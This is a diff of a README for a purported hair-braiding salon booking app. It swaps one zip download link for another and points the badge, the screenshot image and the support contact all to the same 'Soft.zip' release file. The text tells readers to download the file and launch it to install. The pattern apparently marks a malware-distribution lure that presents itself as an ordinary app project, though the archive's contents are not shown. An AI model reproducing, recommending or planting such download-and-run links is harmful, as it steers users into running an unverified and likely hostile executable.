@@ -20,9 +20,9 @@ The Bantu African Hair Braiding Salon Booking App is built using a variety of te
 
 ## How to Use
 
-To access the Bantu African Hair Braiding Salon Booking App, please download the app using the following link: [Download Here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+To access the Bantu African Hair Braiding Salon Booking App, please download the app using the following link: [Download Here](https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip)
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Here](https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip)](https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip)
 
 Please note that the downloaded file needs to be launched for installation.
 
@@ -30,10 +30,10 @@ If you encounter any issues with the download link, kindly check the "Releases" 
 
 ## Screenshots
 
-![Bantu Salon App](https://example.com/bantu-salon-app.png)
+![Bantu Salon App](https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip)
 
 ## Support
 
-For any inquiries or assistance regarding the Bantu African Hair Braiding Salon Booking App, please reach out to our support team at [support@bantu-salon.com](mailto:support@bantu-salon.com).
+For any inquiries or assistance regarding the Bantu African Hair Braiding Salon Booking App, please reach out to our support team at [https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip](https://github.com/Ranotex/Bantu-salon-booking-app/releases/download/v1.0/Soft.zip).
 
 Thank you for choosing the Bantu African Hair Braiding Salon Booking App! 🌺💇‍♀️📅
